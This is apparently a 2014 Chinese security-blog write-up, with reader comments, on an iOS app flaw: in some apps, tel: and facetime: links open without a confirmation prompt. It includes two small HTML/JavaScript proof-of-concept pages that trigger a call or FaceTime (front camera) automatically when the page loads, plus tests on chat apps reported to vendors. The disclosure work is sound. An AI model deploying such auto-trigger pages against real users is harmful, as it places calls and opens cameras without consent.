<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">iOS应用自动拨打电话，开启摄像头缺陷</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Ano_Tom</a> <span class="bull">·</span> <time title="2014/08/27 16:41" ui-time="" datetime="2014/08/27 16:41" class="published ng-binding ng-isolate-scope">2014/08/27 16:41</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>国外一安全研究者发现该缺陷，在iOS设备上的某些应用里（其测试的Google+、Facebook Messenger、Gmail都成功触发），当用户点击了构造好的链接时，会自动拨打电话，或开启facetime，从而打开前置摄像头，且无任何提醒。缺陷产生的原因是开发者没有看清官方开发文档对于Phone Links和FaceTime Links中这样的一条说明，“当用户在本地应用里打开该类型的链接时，iOS并不展示提醒窗口"，从而导致缺陷的产生。</p><h2>0x01 缺陷描述</h2><hr><p>查看苹果官方文档，对于URL方案的规定大致有如下几种类型：</p><h3>1）Mail Links（发送邮件）</h3><p>点击该类型的链接后，会自动调用邮件应用，且mailto URL必须指定一个收件地址。</p><p>网页链接中的字符串格式如下</p><pre><code>&lt;a href="mailto:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="600612010e0b201717040304050d0f4e0518010d100c054e030f0d">[email&#160;protected]</a>"&gt;John Frank&lt;/a&gt;
</code></pre><p>本地应用上的URL字符串格式为</p><pre><code>mailto:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6a0c180b04012a1d1d0e090e0f0705440f120b071a060f44090507">[email&#160;protected]</a>
</code></pre><p>当然也可以在字符串中添加主题等内容，比如</p><pre><code>mailto:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0660696946637e676b766a632865696b">[email&#160;protected]</a><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ac93cfcf91cecddeecc9d4cdc1dcc0c982cfc3c1">[email&#160;protected]</a>&amp;subject=Greetings%20from%20Cupertino!&amp;body=Wish%20you%20were%20here!
</code></pre><p>具体的mailto格式可以查看RFC文档</p><p><a href="http://www.ietf.org/rfc/rfc2368.txt">http://www.ietf.org/rfc/rfc2368.txt</a></p><h3>2）Phone Links（拨打电话）</h3><p>tel类型的URL是用来开启iOS设备上拨打电话的应用，并且拨打指定的号码。当用户在网页中点击了一个该类型的链接时，iOS设备会弹出提醒窗口，询问用户是否拨打该号码，若用户同意则开始拨打电话。但是当用户在本地应用里打开该类型的链接时，iOS并不展示提醒窗口，而是直接拨打指定的电话。当然本地应用可以配置是否显示提醒。</p><p>比如在网页中嵌入一个a标签，内容为</p><pre><code>&lt;a href="tel:10086"&gt;fuck it&lt;/a&gt;
</code></pre><p>那么访问该页面，点击fuck it链接后自动弹出拨打电话的提醒。如图1</p><p><img alt="2014082711012276720.png" img-src="c8a2b9a9ae1c53957cb53385c607c1add19fb335.jpg"></p><p>官方文档同时给出了本地应用里的url形式，本地应用中URL字符串为tel:1-408-555-5555</p><p>在短信页面输入tel://10086点击后会提示拨打电话，如图2</p><p><img alt="2014082711020263770.png" img-src="4925c04a44666ecdc43a32e8a74ea49898837848.jpg"></p><p>同时防止恶意的请求，链接里包含* #字符时，系统并不会拨打该号码。而且iOS上的电话号码的识别检测是默认开启的，如果想让网页上包含的数字不被识别为手机号码，则需要在网页中加入如下的标签</p><pre><code>&lt;meta name = "format-detection" content = "telephone=no"&gt;
</code></pre><p>具体的URL方案可以查看如下RFC文档，</p><p><a href="http://www.ietf.org/rfc/rfc2396.txt">http://www.ietf.org/rfc/rfc2396.txt</a> <a href="http://www.ietf.org/rfc/rfc2806.txt">http://www.ietf.org/rfc/rfc2806.txt</a></p><h3>3）FaceTime Links（开启facetime，开启前置摄像头）</h3><p>FaceTime类型的URL是用来调用FaceTime应用拨打指定的用户，可以是电话号码或者是绑定的邮箱地址。当用户在网页里点开FaceTime类型的URL时，系统会提示是否拨打；但是当在本地应用里点击该类型的URL时，iOS直接开启FaceTime应用拨打电话，而无提醒。本地应用可以配置是否显示提醒。 网页中的链接格式为</p><pre><code>&lt;a href="facetime:14085551234"&gt;Connect using FaceTime&lt;/a&gt;
&lt;a href="facetime:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="631610061123061b020e130f064d000c0e">[email&#160;protected]</a>"&gt;Connect using FaceTime&lt;/a&gt;
</code></pre><p>本地应用中URL字符串为</p><pre><code>facetime:// 14085551234
facetime:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1d3232686e786f5d78657c706d7178337e7270">[email&#160;protected]</a>
</code></pre><p>当然防止恶意请求，链接里包含* #字符时，系统并不会拨打该号码。而且iOS7之前的系统，用该协议拨打电话时候，是用的默认普通的拨打电话的应用而不是FaceTime应用</p><h3>4）SMS Links（发送短信）</h3><p>SMS方案是用来打开短信应用，其URL格式如下sms:<phone>其中<phone>指定目标用户的号码，可以包含0到9的数组和+-.三个字符，并且URL字符串不能包含任何其他的文本信息</phone></phone></p><p>网页中的链接格式为</p><pre><code>&lt;a href="sms:"&gt;Launch Messages App&lt;/a&gt;
&lt;a href="sms:1-408-555-1212"&gt;New SMS Message&lt;/a&gt;
</code></pre><p>本地应用中URL字符串为</p><pre><code>sms:1-408-555-1212
</code></pre><h3>5）其他类型的Links</h3><p>其他像Map Links（打开地图）、iTunes Links（打开iTunes）、YouTube Links（打开YouTube）等不一一介绍，是点击指定的链接后打开相应的地图、iTunes应用等，详细查看苹果官方开发文档。</p><p>由上述的介绍可以看出，其中可以利用的有Phone Links和FaceTime Links。因为其中都有一条这样的描述，如果链接是在本地应用里，则点击的话会直接调用相关系统应用，而没有任何提醒。</p><p>即如果在应用里直接输入tel://xxxx、facetime://xxxx类似的字符，会直接调用相关拨号应用。同样我们可以在应用里输入网页链接，然后在网页内容里嵌入这样的a标签链接，然后利用js实现加载网页时自动点击该a标签链接。</p><p>所以具体的测试代码如下，将其保存为html文件即可。</p><pre><code>&lt;a id="target" href="facetime:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0c446d6f674a637e4a7e69696863614c6a6e65226f6361">[email&#160;protected]</a>"&gt;click me&lt;/a&gt; 
&lt;script&gt; 
var target = document.getElementById("target"); 
var fakeEvent = document.createEvent("MouseEvents"); 
fakeEvent.initEvent("click", true, false); 
target.dispatchEvent(fakeEvent); 
&lt;/script&gt;
</code></pre><p>或者如下</p><pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;v&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;a id="dial" href="tel:10086"&gt;fuck it&lt;/a&gt;
&lt;/body&gt;
&lt;script type="text/javascript"&gt;
&lt;!--
window.onload = function()
{
    window.location.href = document.getElementById("dial").href;
};
//--&gt;
&lt;/script&gt;
&lt;/html&gt;
</code></pre><p>tel:xxxxx表示要拨打的电话，点击该链接后则自动拨打电话；</p><p>facetiem:xxxxx表示拨打的facetime帐号，点击该链接后自动开启摄像头，无任何提醒；</p><blockquote><p>注：其中第二个代码在某些应用里测试没有执行成功，第一个代码在应用里基本能执行成功。</p></blockquote><h2>0x02 案例测试</h2><hr><p>测试了国内的几个常用的聊天类应用，基本都存在该缺陷，已经报告给厂商，修复可能需要一段时间。这里以在乌云上提交的易信为案例（官方将发布新版本）。 测试版本为iOS版本6.1.4、易信V2.9.0.1680</p><p>在朋友圈发布该url，如图3</p><p><img alt="2014082711044861565.png" img-src="a9627f51dbca5723a152fcf33f01d21b3c22c68c.jpg"></p><p>好友点击后自动拨打电话或开启FaceTime，如图2、图3</p><p><img alt="2014082711050945066.png" img-src="15fbe65f4b7b225aaeee767a1f856fee0fd8c1aa.jpg"></p><p><img alt="2014082711052082517.png" img-src="b5f6ea03f0125f0747ce9736d7f00766357a1a90.jpg"></p><h2>0x03 如何修复</h2><hr><p>在苹果官方开发文档给出的说明上，在本地应用打开相应的URL是可以配置提醒设置的。所以可能是开发者对苹果URL的规范未全面了解，疏忽导致了该问题。由于未接触过iOS开发，所以具体的修复不清楚。:)</p><p>References：</p><p><a href="http://algorithm.dk/posts/rtfm-0day-in-ios-apps-g-gmail-fb-messenger-etc">http://algorithm.dk/posts/rtfm-0day-in-ios-apps-g-gmail-fb-messenger-etc</a> <a href="https://developer.apple.com/library/ios/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html#//apple_ref/doc/uid/TP40007899-CH6-SW1">https://developer.apple.com/library/ios/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html#//apple_ref/doc/uid/TP40007899-CH6-SW1</a> <a href="https://developer.apple.com/library/ios/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html#//apple_ref/doc/uid/TP40007899-CH6-SW1">https://developer.apple.com/library/ios/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html#//apple_ref/doc/uid/TP40007899-CH6-SW1</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/104" rel="bookmark" id="re1">Clickjacking简单介绍</a></li><li><a href="http://drops.wooyun.org/papers/382" rel="bookmark" id="re2">闲扯下午引爆乌云社区“盗窃”乌云币事件</a></li><li><a href="http://drops.wooyun.org/papers/894" rel="bookmark" id="re3">XSS挑战第一期Writeup</a></li><li><a href="http://drops.wooyun.org/papers/526" rel="bookmark" id="re4">浏览器安全（一）</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">vf3ng</span> <span class="reply-time">2014-09-04 14:16:13</span></div><p></p><p>能CSRF就好了，比如开启定位各种....</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ano_Tom</span> <span class="reply-time">2014-08-30 23:45:11</span></div><p></p><p>前台会显示的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">李白</span> <span class="reply-time">2014-08-30 17:13:28</span></div><p></p><p>问一下，facetime的话，是后台运行还是前台有显示</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-08-28 11:00:00</span></div><p></p><p>这个问题貌似很早之前就曾经披露过，只是没有得到大家的重视</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ano_Tom</span> <span class="reply-time">2014-08-28 10:44:31</span></div><p></p><p>正常情况下都应该有提醒。但是部分应用是存在缺陷，比如qq最新版、ipad版、qq微视（官方已经忽略此Bug）。输入url后自动拨打，无任何提醒。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-08-28 09:34:45</span></div><p></p><p>有的能够不需要确认哦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2014-08-28 09:15:32</span></div><p></p><p>会弹出确认框，感觉属于正常功能，可能有些设计不合理。<br>如果不弹确认直接执行那就有搞头了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-08-27 19:13:23</span></div><p></p><p>如果可以想办法让这个在后台自动运行 我相信是可以做到窃听与监控了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ano_Tom</span> <span class="reply-time">2014-08-27 18:24:21</span></div><p></p><p>就是app的缺陷，我标题写的是iOS应用，其他地方不对，求指正修改。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-08-27 18:18:41</span></div><p></p><p>这个我觉得是app 的缺陷唉</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-08-27 17:56:01</span></div><p></p><p>出现fu*k一词，掉档次的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ano_Tom</span> <span class="reply-time">2014-08-27 17:12:37</span></div><p></p><p>不是iOS缺陷，是软件的缺陷，表述有误吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌帽子</span> <span class="reply-time">2014-08-27 17:10:55</span></div><p></p><p>这怎么成ios的缺陷了，几年前山寨机、诺基亚就这样子的功能</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ano_Tom</span> <span class="reply-time">2014-08-27 17:10:08</span></div><p></p><p>嗯，iOS6 7都存在的，iOS8没测试</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瓶</span> <span class="reply-time">2014-08-27 17:08:20</span></div><p></p><p>iOS 7和8也有么？</p><p></p></div></div></div></div></div></main>